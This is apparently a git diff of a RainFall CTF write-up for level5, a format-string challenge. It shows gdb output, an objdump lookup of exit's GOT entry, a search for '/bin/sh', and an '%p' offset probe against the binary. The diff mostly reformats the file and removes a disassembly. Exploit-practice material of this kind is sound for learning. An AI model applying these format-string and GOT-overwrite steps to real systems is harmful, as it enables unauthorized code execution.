@@ -39,7 +39,7 @@ Dump of assembler code for function n:
 
 (gdb) info function 
 All defined functions:
-
+ # this function is not called in the main and n 
 Non-debugging symbols:
 0x08048334  _init
 0x08048380  printf
@@ -84,40 +84,13 @@ Non-debugging symbols:
 
 level5@RainFall:~$ gdb -q ./level5 
 Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
-(gdb) b main
-Breakpoint 1 at 0x8048507
-(gdb) disas main
-Dump of assembler code for function main:
-   0x08048504 <+0>:	push   %ebp
-   0x08048505 <+1>:	mov    %esp,%ebp
-   0x08048507 <+3>:	and    $0xfffffff0,%esp
-   0x0804850a <+6>:	call   0x80484c2 <n> # call function n 
-   0x0804850f <+11>:	leave  
-   0x08048510 <+12>:	ret    
-End of assembler dump.
-(gdb) disas n 
-Dump of assembler code for function n:
-   0x080484c2 <+0>:	push   %ebp
-   0x080484c3 <+1>:	mov    %esp,%ebp
-   0x080484c5 <+3>:	sub    $0x218,%esp # 512 bytes to read via fgets
-   0x080484cb <+9>:	mov    0x8049848,%eax
-   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
-   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
-   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
-   0x080484e2 <+32>:	mov    %eax,(%esp)
-   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
-   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
-   0x080484f0 <+46>:	mov    %eax,(%esp)
-   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
-   0x080484f8 <+54>:	movl   $0x1,(%esp)
-   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
-End of assembler dump.
+```
 
 int this case we have no global variable to overwrite or something like 
 
 
 
-
+```bash
 (gdb) b system 
 Breakpoint 2 at 0x80483b0
 (gdb) find system,+999999999,"/bin/sh"
@@ -130,10 +103,10 @@ lets  check the exit :
 level5@RainFall:~$ objdump -R ./level5 | grep exit
 08049828 R_386_JUMP_SLOT   _exit
 08049838 R_386_JUMP_SLOT   exit
+```
 the offset:
 
-
-
+```bash
  python -c 'print("AAAA" + "%p "*20)' | ./level5 
 AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
